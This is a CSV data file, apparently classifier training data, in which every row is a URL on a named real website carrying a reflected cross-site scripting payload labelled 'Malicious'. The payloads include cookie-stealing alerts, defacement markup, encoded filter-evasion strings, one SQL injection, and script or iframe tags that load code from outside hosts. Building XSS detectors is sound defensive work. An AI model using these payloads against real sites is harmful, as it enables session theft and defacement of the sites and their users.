Payloads,Class
http://ringtones.nl.msn.com/games.php?rtch=1&rtlo=%22%3e%3c/title%3e%3cstyle%3ebody{visibility:hidden;}%20html{background-color:%20black;}%3c/style%3e%27%22%3e%3cdiv%20style=%22position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%2010;visibility:%20visible;%20color:%20white;%20font-size:%2020px;%22%3e%3cimg%20src=%22http://img257.imageshack.us/img257/3733/77822687.png%22%20style=%22height:%20400px;%20width:%20600px;%22%20alt=%22by%20sony%22%3e%3cbr%3eby%20sony%3ciframe%20src=%22http://insecurity.ro%22%3e,Malicious
http://ttfd.gov.tw/info.sphp?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscript%3ealert(document<br>.cookie)%3c/script%3e,Malicious
http://2.tool.ms/pwmail.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://losangeles.angels.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://www.odp.org.tr/genel/bizden_detay.php?kod=584&amp;tipi=4&amp;sube=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cheminsdememoire.gouv.fr/page/affichelieu.php?idlang=fr&amp;idlieu=%22%3e'%3e%3cscript%20src=<br>http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://etoilecasting.tf1.fr/liste-artistes.php?currentpage=1&amp;type=pseudo&amp;filtre=0&amp;profil=&amp;sexe=&amp;age=<br>&amp;region=&amp;periode=&amp;photo=&amp;video=&amp;audio=&amp;pseudo=\%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br>&amp;affichage=liste,Malicious
http://www.leadingedgesafaris.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;,Malicious
http://www.stickam.jp/searchmedia.do?mediatype=image&amp;searchby=tag&amp;searchfor=&amp;sortby=%22%3e%27%3e%3cs<br>cript%3ealert%28%22xss%22%29%3c%2fscript%3e,Malicious
http://shop.tsukumo.co.jp/search/?referer=header&amp;category=20'%3e%22%3e%3cscript/src=http://kusomiso.<br>com/xss.js%3e%3c/script%3e&amp;return_url=search%2f&amp;keyword=xss_by_kusomiso.com&amp;x=0&amp;y=0,Malicious
http://www.easyphp.org/telechargements/dn.php?f=%22%3e%22%3e%3cscript%3ealert(/scr34m/);%3c/script%3<br>e,Malicious
http://www.bayrou.fr/index.html?action=search&amp;query=%3cscript%3ealert%28document.cookie%29%3c%2fscri<br>pt%3e&amp;index=site_index&amp;searchpage=1&amp;uri=%2findex.html&amp;__locale=en&amp;query2=%3cscript%3ealert%28documen<br>t.cookie%29%3c%2fscript%3e&amp;envoyer.x=19&amp;envoyer.y=26,Malicious
http://www.naidunia.com/articles.asp?article_no=11907021301&amp;yy=2007&amp;mm=2&amp;dd=13&amp;title=&lt;script&gt;alert(&quot;<br>scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious
http://www.motour.gov.my/installation_prior/phpinfo.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/<br>script%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.ebizstudio.com/igallery33/login.asp?folder=seth&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wen-tech.com/news.asp?pid=3&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3<br>e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://lariccia-pc2.pg.infn.it/bmachine/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript<br>%20%0a%0d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://express.bandai.co.jp/m/index.cgi?id=1&amp;mode=individual&amp;no=1&amp;eid=11'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3ehttp://express.bandai.co.jp/m/index.cgi?id=1&amp;mode=individual&amp;n<br>o=1&amp;eid=11'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.syn.gr/gr/search.php?searchtext=%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.ogame.com.es/screenshot.php?pic=battleship_1280x1024&amp;type=php&amp;path=h&quot;&gt;&lt;/img&gt;&lt;script&gt;alert<br>(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious
http://www.ea.com/official/uo/samurai/us/scripts/screenshots_js.inc?setid=first&amp;urlid=%22%3e%3cscrip<br>t%3ealert(/www.r3t.n3t.nl/)%3c/script%3e,Malicious
http://www.hsbcculturalexchange.com/thumbnail.php?image=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpo<br>wer%20-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fotobearbeitung.ch/cms31/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tangopc.lt/default.asp?act=srch&amp;f1=636&amp;srchval=%22%3cscript%3ealert%287%29%3b%3c%2fscript<br>%3e&amp;x=2&amp;y=16,Malicious
http://www.computerworld.com/action/inform.do?command=search&amp;searchterms=f-secure+corporation}&quot;&gt;&lt;scr<br>ipt&gt;alert(&quot;test&quot;)&lt;/script&gt;,Malicious
http://ms108.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.springer.com/generic/search/results?visited=true&amp;searchtype=advanced&amp;resultstart=1&amp;result<br>count=10&amp;sgwid=4-40109-13-0-0&amp;submit.x=27&amp;submit.y=7&amp;querytext=%22%3e%3cscript+src%3dhttp%3a%2f%2fvu<br>ln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c%2fscript%3e&amp;authoreditor=&amp;isbnissn=%22%3e%3<br>cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c%2fscript%3e&amp;ti<br>tle=&amp;bookseries=&amp;publicationcomparator=after&amp;publicationyear=&amp;language=&amp;imprint=&amp;topics=&amp;categories=,Malicious
http://engineering.jhu.edu/calendar/?calview=year&amp;year=2009&amp;month=03&amp;day=26&amp;type_id=17&amp;event_id=1337<br>%22%3e%3cscript%3ealert(1337)%3c/script%3e&amp;prevview=year,Malicious
http://www.mondogelato.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.alexandra.no/index.asp?p_id='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%<br>3ewhitehat%20forever%3c/marquee%3e&amp;flash=1&amp;meny=1&amp;sub=2&amp;lang=eng,Malicious
https://knowledge.mcafee.com/supportsite/search.do?languages=&amp;rwtarget=%2frfplayerwidget.do&amp;searchmo<br>de=%22%3e%3cmarquee%3e%3ch%31%3ethis_site_is_not_mcafee_secure%3c%2fh%31%3e%3c%2fmarquee%3e&amp;searchst<br>ring=test&amp;product=&amp;document=&amp;cmd=search&amp;productfamily=&amp;contexttype=gs,Malicious
http://www.maerealestate.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=3201&amp;hid<br>eresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3ealert(<br>'norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/m<br>arquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibe<br>rnautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%<br>20%3c,Malicious
http://www.skaitiklis.lt/index.php?a=search&amp;q=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
http://www.vienna.at/tools/surfandwin/gewinnen/gewinnen.asp?meldung=&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious
http://concours.fonction-publique.gouv.fr/gcp/pages/enginename/search/score;jsessionid=386b36e4d271b<br>e6b5f753edffa7b61b4.pp22?pagesearchresultbuilder.onlyonehitbypage=true&amp;searchview=simple&amp;maxpageitem<br>s=15&amp;search=&amp;withoutwordsearch=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.ulkeryapi.com/productstr.asp?~pid=398&amp;pcatname=%3ch1%3efucked%3c/h1%3e,Malicious
http://www.cemr.wvu.edu/news/jobs-details.php?id=65&amp;type=ft&amp;typename=%22%3e%3cscript%3ealert(1)%3c/s<br>cript%3e,Malicious
http://www.italia.gov.it/servlet/contentserver?pagename=e-italia%2finnerpage&amp;canale=1147958714289&amp;ca<br>tegoria=1147958715618&amp;nodo=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://recherche.lejournaldemontreal.canoe.ca/?sen=montreal&amp;ie=utf-8&amp;q=asd%22%2f%3e%3cscript%3ealert<br>%28document.cookie%29%3b%3c%2fscript%3e,Malicious
http://www.jrc.or.jp/active/saigai/news/list.cgi?md=%22%3e'%3e%3c/script%3e%3cscript%3ealert('xss%20<br>by%20kusomiso.com')%3c/script%3e,Malicious
http://happynewyear.com/search.php?uid=ws104779728bdeb8a4.16%22%3e'%3e%3cscript%3ealert(/xss/)%3c/sc<br>ript%3e401799&amp;src=&amp;term=holiday+lights&amp;args=qs%3d06oenya4zgjblucri9zo45n81yqmmu0buxfdpasfjpbuixg0kp4<br>cac_ju0-hv939gcomitdnpieiysvg6ivdchay_t9-vrog9_pprbeyt-mcg14wet8yzeo98qtwbyil3pk6ealexvtiyyouymup_6z<br>yqo1nwk3jsgkut63ctsm9najn7lbfakjbs0b0hnoycinkdifgrn3ubdmtpu0w9z5xvvv9-u6ronea..%2cyt0z&amp;sec=r,Malicious
http://www.kecioren.bel.tr/altkonular.asp?id=22&amp;baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.polimi.it/motore_di_ricerca/polimi.standard.php?exclude=&amp;config=polimi.standard&amp;method=an<br>d&amp;format=default&amp;sort=score&amp;ricerca=avanzata&amp;words=%22%3e%3cscript%3ealert%28%2fscr34m%2f%29%3b%3c%2<br>fscript%3e&amp;sito=ateneo,Malicious
https://knowledge.verisign.com/support/registrar/index?page=nosidebarlogin&amp;returnqs=&quot;&gt;&lt;script&gt;alert(<br>/xss/)&lt;/script&gt;,Malicious
http://userfriendly.org/cgi-bin/survey.cgi?personalemail=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://forumeco.com/articles/portraits.php?idp=-1%22%3e%3cscript%3ealert%28document.cookie%29;%3c/sc<br>ript%3e,Malicious
http://www.masslottery.com/cgi-bin/search_dir/search.cgi?q=&quot;&gt;&lt;script&gt;alert('zomg pappy won the<br>lottery!');&lt;/script&gt;&amp;e=1&amp;x=0,Malicious
http://www.cadesign.com.br/aec/artigos_detalhes.asp?cod_artigo=229&amp;edicao=%3cscript%3ealert(666)%3c/<br>script%3e&amp;secao=leitor%20on-line,Malicious
http://mws.ask.com/mywebsearch/ajmain.jhtml?searchfor=%22%3cscript%3ealert%28%22xssed%22%29%3c%2fscr<br>ipt%3e%22%3cscript%3ealert%28%22xssed%22%29%3c%2fscript%3e&amp;st=hp&amp;ptnrs=&amp;ptb=&amp;tpr=,Malicious
http://www.tangoizmir.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=%22%3e%3cscript%3ealert(<br>%22xssedbycicosz%22)%3c/script%3e,Malicious
http://www.ema.europa.eu/ema/index.jsp?curl=pages/includes/medicines/medicines_landing_page.jsp&amp;quic<br>ksearch=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.chcf.org/error/index.cfm?eurl=http%3a%2f%2fwww%2echcf%2eorg%2ftopics%2findex%2ecfm%3ftopi<br>c%3d%22%3e%3cscript%3ealert%28document%2ecookie%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3eby%2bnarcot<br>icxs%3c%2fh1%3e%3c%2fmarquee%3e&amp;etype=chcf.missing_content&amp;emessage=invalid%20topic%20id%20passed.&amp;e<br>detail=&amp;ecode=,Malicious
http://www.bridgesprojectonline.org/html/test-juniornet-1-rule-a.cfm?session_id=&quot;&gt;&lt;script&gt;alert(&quot;max<br>wel&quot;)&lt;/script&gt;,Malicious
http://www.pjn.gov.ar/buscador.php?texto=%22%3e%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://washington.nationals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious
http://www.bugdoctor.co.kr/shop/board/view.php?id=gallery&amp;no=35/shop.php?id=%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e,Malicious
http://www.emilycousins.com/searchresults.asp?searchstring=%22%3e%3cscript%3ealert(%22backdoor%22)%3<br>c/script%3e,Malicious
http://web4.internet.gov.sg/scripts/judiciary/subct/search.asp?target=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.ebaita.com/enciclopedia.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/scri<br>pt&gt;,Malicious
http://hokulea.soest.hawaii.edu/ocn435/wiki/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(1)&gt;,Malicious
http://lms.larc.nasa.gov/search.cfm?cont=yes&amp;keywords=&amp;num=&lt;&quot;&lt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&amp;class=&amp;search=search,Malicious
http://absholdings.biz/?s=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://www.og-elsengrund.cidsnet.de/oae_hp/include.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.teliase.idlesurf.net/cgi-bin/search_telia_se.pl?query=--%3e%3cscript%3ealert(123)%3c/scri<br>pt%3e&amp;site=privat,Malicious
http://penche.com/penche.asp?page=1&amp;detail=%22%3e%3cscript%3ealert(%22bjk:1-2:sivas%22)%3c/script%3e<br>&amp;bolum=1,Malicious
https://shopping.ccbill.com/search.cgi?search=%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss.js%3e%<br>3c%2fscript%3e&amp;adult=0&amp;generalsearch=%a0%a0%a0search%a0%a0%a0,Malicious
"https://sitecreator.directnic.com/template_designer/view_enlarged_template.php?catid=1&amp;tempid=25%20u<br>nion%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%3cscript%3ealert(document.cookie)<br>%3c/script%3e/*",Malicious
http://www.asco.org/portal/site/anf/menuitem.8f6d1d4a064dae4107078010ee37a01d/?vgnextoid=&quot;&gt;&lt;script&gt;a<br>lert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.handwerk-oldenburg.de/weiterbildung/ausgabeform-s.cfm?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://about.com/gi/pages/shareurl.htm?pg=x%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;zitl=parents'%2<br>0choice%20awards,Malicious
"http://skicircus.loop-server.com/unsubscribe.asp?m=1&email=""'>""'><script>window.alert(document.cookie)</script>",Malicious
http://www.blogged.my/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.yello.com.sg/realestate.php?cat1=realestate&amp;catid=3&amp;pr=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://suche.community.freenet.de/freunde-finden/index.html?sort=by_lastlogin&amp;table=galerie&amp;sl_alter<br>sbereich=egal&amp;tb_nickname=%22%3e%3cscript%3ealert(/totalschaden/)%3c/script%3e&amp;tb_plz=&amp;sl_bundesland<br>=egal&amp;suche_starten.x=34&amp;suche_starten.y=12&amp;aktion=ver_searching_bearbeiten,Malicious
http://web.krg.org/services/search_archive.asp?frmarticlestartdateday=1&amp;frmarticlestartdatemonth=1&amp;f<br>rmarticlestartdateyear=2007&amp;frmarticleenddateday=2&amp;frmarticleenddatemonth=7&amp;frmarticleenddateyear=20<br>07&amp;frmarticlerubricnr=223%2c73&amp;frmkey=&lt;h1&gt;%22%3cscript%3ealert%28%22backdoor%22%29%3c%2fscript%3e&amp;fr<br>msearch=go&amp;frmaction=search&amp;frmorigination=%2fservices%2fsearch_archive.asp&amp;lngnr=12,Malicious
http://www.shoppingplace.com/cgi-bin/search/hyperseek.cgi?terms=%3ch1%3e%3cmarquee%3exssed_by_uber0n<br>%3c%2fh1%3e&amp;howmuch=all&amp;range=all&amp;x=&amp;db=,Malicious
http://www.frontnational.com/multimedia_radios_detail.php?id=54&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
"http://www.ur.gov.lv/index.php?t=5&amp;v=eng&amp;m=';alert(string.fromcharcode(88,83,83))//\';alert(string.f<br>romcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,<br>83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;m<br>eklet3.x=18&amp;meklet3.y=13",Malicious
http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;,Malicious
http://www.airforce.com/careers/subcatg.php?catg_id=%22%3e%3c%2f%69%66%72%61%6d%65%3e%3c%73%63%72%69<br>%70%74%3e%61%6c%65%72%74%28%27%78%73%73%27%29%3b%3c%2f%73%63%72%69%70%74%3e,Malicious
http://www.afpc.info/content.php?sectionid=4&amp;contentid=77&amp;newsletterid=&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious
http://www.measurement.gov.au/index.cfm?event=search.showform%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
"http://itn.co.uk/search?q=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83<br>,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c<br>/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.nt.gov.au/dpifm/primary_industry/index.cfm?header=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.vidsea.com/?p=%3cscript%3ealert(1)%3c%2fscript%3e,Malicious
http://search.access.gpo.gov/eeoc/searchright.asp?ct=eeoc&amp;q1=%27%3balert%28string.fromcharcode%2888%<br>2c83%2c83%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28st<br>ring.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%2<br>9%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%<br>3c%2fscript%3e,Malicious
http://phponlyscripts.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.geneve.ch/votations/20070311/detail.asp?portee=%22%3e%3cbody+onload=alert(%22by%20encore%<br>22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.fee.rs.gov.br/sitefee/pt/content/resumo/pg_municipios_detalhe.php?municipio=%22%3e'%3e%3c<br>script%20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.zdnet.com.au/services/search/?exclude=&amp;method=and&amp;sort=date&amp;query=%22%3e%3cscript%3ealert<br>%28document.cookie%29%3c%2fscript%3e&amp;collection=all,Malicious
http://www.alconomics.com/php/members.php?id=34%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e,Malicious
http://www.jucky29.com/news.cgi?date=2007.10.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.contemporarywatercolours.co.uk/servlet/controllerservlet/showcollectionlist?collectionid=<br>&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
https://secure.instantssl.com/products/passwordresetrequest?ordernumber=%22%3e%3cscript%3ealert(1);%<br>3c/script%3e,Malicious
http://www.ipost.co.kr/list_stock.asp?q=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cm<br>arquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
http://ronsloan.net/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.modella.info/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://gallys.scoreondemand.com/movies/044.bustycreamteam/?nats=mtiynj...}%3c/style%3e%3cscript%3ea=<br>eval;b=alert;a(b(/xss/.source));%3c/script%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sourc<br>e));%3c/script%3e,Malicious
http://www.energystar.gov/index.cfm?fuseaction=search.showresults&amp;output=xml_no_dtd&amp;oe=utf-8&amp;ie=utf-<br>8&amp;q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sampsoncenterstage.wordwrightserver.com/eventphotos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.neseek.com/results.php?search=%22%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscript%3e<br>%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=search,Malicious
http://www.evaluation.lars-balzer.name/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
